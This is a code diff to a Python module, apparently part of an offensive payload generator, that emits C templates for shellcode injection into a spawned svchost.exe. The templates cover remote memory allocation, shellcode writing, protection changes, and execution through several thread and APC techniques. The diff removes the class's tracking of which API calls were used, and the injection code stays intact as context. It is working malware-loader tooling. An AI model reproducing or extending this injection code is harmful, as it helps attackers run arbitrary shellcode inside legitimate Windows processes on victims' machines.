@@ -5,7 +5,6 @@ import sys
 class spawnandinject:
     def __init__(self, arguments):
         self.memoryPermission = 'PAGE_EXECUTE_READ'
-        self.apicallsList = ['CloseHandle']
         self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
         if 'perm' in arguments:
             if arguments['perm'] == 'rwx':
@@ -31,7 +30,6 @@ class spawnandinject:
     HANDLE hProcess = pi.hProcess;
     HANDLE hThread = pi.hThread;
 """).substitute(target=self.target)
-            self.apicallsList += ['CreateProcessA']
         elif self.spawn == 'NtCreateUserProcess':
             parsed = PureWindowsPath(self.target)
             curdir = str(parsed.parent).replace('\\','\\\\')
@@ -60,7 +58,6 @@ class spawnandinject:
  
     {NtCreateUserProcess}(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, 0, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, procParams, &createInfo, &attrList);
 """).substitute(target=self.target, image=image, curdir=curdir)
-            self.apicallsList += ['NtCreateUserProcess', 'RtlCreateProcessParametersEx']
 
         self.allocation = 'VirtualAllocEx'
         if 'allocation' in arguments:
@@ -73,14 +70,12 @@ class spawnandinject:
             self.allocationCode = """
     LPVOID buffer = {VirtualAllocEx}(hProcess, NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 """
-            self.apicallsList += ['VirtualAllocEx']
         elif self.allocation == 'NtAllocateVirtualMemory':
             self.allocationCode = """
     PVOID buffer = NULL;
     SIZE_T allocationSize = {shellcodeSize};
     {NtAllocateVirtualMemory}(hProcess, &buffer, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 """
-            self.apicallsList += ['NtAllocateVirtualMemory']
 
         self.write = 'WriteProcessMemory'
         if 'write' in arguments:
@@ -93,13 +88,11 @@ class spawnandinject:
             self.writeCode = """
     {WriteProcessMemory}(hProcess, buffer, (PVOID)shellcode, (SIZE_T){shellcodeSize}, (SIZE_T *)NULL);
 """
-            self.apicallsList += ['WriteProcessMemory']
         elif self.write == 'NtWriteVirtualMemory':
             self.writeCode = """
     SIZE_T bytesWritten = 0;
     {NtWriteVirtualMemory}(hProcess, buffer, shellcode, {shellcodeSize}, &bytesWritten);
 """
-            self.apicallsList += ['NtWriteVirtualMemory']
 
         self.protect = 'VirtualProtectEx'
         if 'protect' in arguments:
@@ -113,14 +106,12 @@ class spawnandinject:
     DWORD oldProtect;
     BOOL out = {VirtualProtectEx}(hProcess, buffer, {shellcodeSize}, $memoryPermission, &oldProtect);
 """).substitute(memoryPermission=self.memoryPermission)
-            self.apicallsList += ['VirtualProtectEx']
         elif self.protect == 'NtProtectVirtualMemory':
             self.protectCode = Template("""
     SIZE_T size = {shellcodeSize};
     ULONG OldProtect; 
     {NtProtectVirtualMemory}(hProcess, &buffer, &size, $memoryPermission, &OldProtect);
 """).substitute(memoryPermission=self.memoryPermission)
-            self.apicallsList += ['NtProtectVirtualMemory']
 
         self.execution = 'CreateRemoteThread'
         if 'execution' in arguments:
@@ -133,14 +124,12 @@ class spawnandinject:
             self.executionCode = """
     HANDLE newThread = {CreateRemoteThread}(hProcess, NULL, 0, buffer, NULL, 0, NULL);
     """
-            self.apicallsList += ['CreateRemoteThread']
         elif self.execution == 'QueueUserAPC':
             self.executionCode = """
     PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)buffer;
     {QueueUserAPC}((PAPCFUNC)buffer, hThread, (ULONG_PTR)NULL);
     {ResumeThread}(hThread);
 """
-            self.apicallsList += ['QueueUserAPC', 'ResumeThread']
         elif self.execution == 'SetThreadContext':
             self.executionCode = """
     CONTEXT ctx = {{ 0 }};
@@ -152,20 +141,17 @@ class spawnandinject:
     }}
     {ResumeThread}(hThread);
 """
-            self.apicallsList += ['GetThreadContext', 'SetThreadContext', 'ResumeThread']
         elif self.execution == 'NtCreateThreadEx':
             self.executionCode = """
     HANDLE newThread;
     {NtCreateThreadEx}(&newThread, THREAD_ALL_ACCESS, NULL, hProcess, (PVOID)buffer, NULL, (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, NULL);
 """
-            self.apicallsList += ['NtCreateThreadEx', 'WaitForSingleObject']
         elif self.execution == 'NtQueueApcThread':
             self.executionCode = """
     //PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)buffer;
     {NtQueueApcThread}(hThread, buffer, NULL, NULL, 0);
     {ResumeThread}(hThread);
 """
-            self.apicallsList += ['NtQueueApcThread', 'ResumeThread']
 
         if 'wait' in arguments:
             if arguments['wait'] in ['WaitForSingleObject', 'NtWaitForSingleObject', 'None']:
@@ -182,14 +168,12 @@ class spawnandinject:
             self.waitCode = """
     {WaitForSingleObject}(newThread, 500);
 """
-            self.apicallsList += ['WaitForSingleObject']
         elif self.wait == 'NtWaitForSingleObject':
             self.waitCode = """
     LARGE_INTEGER li = {{ 0 }};
     li.QuadPart = 500;
     {NtWaitForSingleObject}(newThread, FALSE, &li);
 """
-            self.apicallsList += ['NtWaitForSingleObject']
         elif self.wait == 'None':
             self.waitCode = ''
 
@@ -205,13 +189,11 @@ class spawnandinject:
     {CloseHandle}(hThread);
     {CloseHandle}(hProcess);
 """
-            self.apicallsList += ['CloseHandle']
         elif self.close == 'NtClose':
             self.closeCode = """
     {NtClose}(hThread);
     {NtClose}(hProcess);
 """
-            self.apicallsList += ['NtClose']
 
     def imports(self) -> list[str]:
         return ["#include <windows.h>",
@@ -224,9 +206,6 @@ class spawnandinject:
     
     def codeblocks(self) -> str:
         return ''
-
-    def apicalls(self) -> list[str]:
-        return self.apicallsList
 
     def template(self) -> str:
         return Template("""
